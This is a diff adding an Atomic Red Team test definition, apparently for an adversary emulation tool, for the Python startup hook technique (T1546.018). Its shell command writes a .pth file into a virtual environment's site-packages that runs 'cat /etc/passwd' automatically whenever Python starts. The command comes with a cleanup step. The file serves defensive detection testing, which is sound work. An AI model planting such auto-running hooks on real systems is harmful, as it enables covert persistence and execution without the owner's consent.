@@ -1,0 +1,46 @@
+- id: 85f21c19-18ef-4450-98d8-05bb7b0e1887
+  name: Python Startup Hook Execution via .pth (Linux)
+  description: Creates a Python startup hook using a .pth file inside a virtual environment
+    on Linux.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    linux:
+      sh:
+        command: PYTHON_EXE=$(command -v python3); TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX);
+          echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt; $PYTHON_EXE -m venv
+          "$TEMPDIR/env"; SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site;
+          print(site.getsitepackages()[0])"); echo "import sys, os; (not hasattr(sys,
+          'hook_run')) and (setattr(sys, 'hook_run', True) or os.system('cat /etc/passwd'))"
+          > "$SITE_PACKAGES/atomic_hook.pth"; "$TEMPDIR/env/bin/python" -c "print('Interpreter
+          started')"
+        cleanup: rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1546.018
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      python_path:
+        description: Path to Python interpreter
+        type: path
+        default: python3
+    dependencies:
+    - description: Ensure Python is installed
+      prereq_command: command -v
+      get_prereq_command: 'echo "Python3 not found. Please install it using your package
+        manager (e.g., ''sudo apt install python3'' or ''sudo yum install python3'')."
+
+        '
+    technique_created: '2025-05-22T19:20:46.740Z'
+    atomic_guid: 85f21c19-18ef-4450-98d8-05bb7b0e1887
+    import_timestamp: '2026-01-08T03:30:46.063622Z'
